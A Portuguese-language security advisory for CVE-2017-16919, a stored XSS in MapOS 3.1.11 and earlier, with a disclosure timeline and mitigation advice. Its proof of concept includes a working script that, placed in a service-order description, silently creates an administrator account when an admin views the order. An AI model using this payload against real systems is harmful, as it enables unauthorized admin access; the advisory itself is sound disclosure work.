---
title: "[CVE-2017-16919] MapOS Stored Cross-site Scripting (XSS) - [PT-BR]"
layout: post
date: '2017-11-23 13:03:55'
description: 'Vulnerabilty: MapOS Stored Cross-site Scripting (XSS)'
image: '/assets/images/logo.png'
tags:
- poc
- cve
author: Alisson Bezerra
---

MapOS é um sistema gratuito de [código aberto](https://github.com/RamonSilva20/mapos){:target="_blank" rel="noopenner noreferrer"} para controle de ordens de serviço.

Neste artigo descrevemos uma falha de cross-site scripting existente nas versões 3.1.11 ou inferiores de MapOS que permite, por exemplo, a um atacante executar comandos quando um administrador visualiza os dados de um cliente que possui ordem de serviço em aberto.

Para explorar a falha, um usuário malicioso pode inserir um código javascript no campo *Descrição da Ordem de Serviço*. Esse código malicioso será executado quando a Ordem de Serviço for visualizada pelo usuário administrador do sistema. Dessa maneira a falha pode ser explorada de diversas maneiras, uma das quais inclui inserir um usuário arbitrário no sistema com privilégios de administrador.

### Proof of Concept

A PoC abaixo mostra os passos necessários para explorar a falha e inserir um usuário arbitrário no sistema com privilégios de administrador:

1.Registrar um novo cliente em http://vulnhost/mapos/index.php/mine

2.Logar com o cliente registrado e adicionar uma nova ordem de serviço, no campo descrição deve ser inserido o código abaixo:
```html
<script>
var dados = "nome=hacker&rg=111&cpf=12312312300&rua=av&numero=123&bairro=centro&cidade=qualquer&estado=SP&email=email%40hacker.com&senha=123456&telefone=111&celular=&situacao=1&permissoes_id=1";
var url = "http://vulnhost/mapos/index.php/usuarios/adicionar";
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send(dados);
</script>
```

3.Quando o usuário administrador visualizar a nova ordem de serviço, o script acima será executado e um novo usuário será criado no sistema com o e-mail email@hacker.com e a senha 123456

### Mitigação
A falha pode ser corrigida realizando uma validação prévia nos dados inseridos na ordem de serviço. A criação de usuário (e outras transações da aplicação) podem ser hardenizadas com uso [*nonces*](https://pt.wikipedia.org/wiki/Nonce){:target="_blank" rel="noopenner noreferrer"} por request para evitar [ataques de CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29){:target="_blank" rel="noopenner noreferrer"}.

Há diversos materiais a respeito de como acontece e [como podem ser evitados ataque de cross-site scripting](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet){:target="_blank" rel="noopenner noreferrer"}.

### Responsible Disclosure
- 11/11/2017 - Descoberta da falha
- 21/11/2017 - Notificação da falha
- 21/11/2017 - Confirmação da correção
- 22/11/2017 - CVE-2017-16919
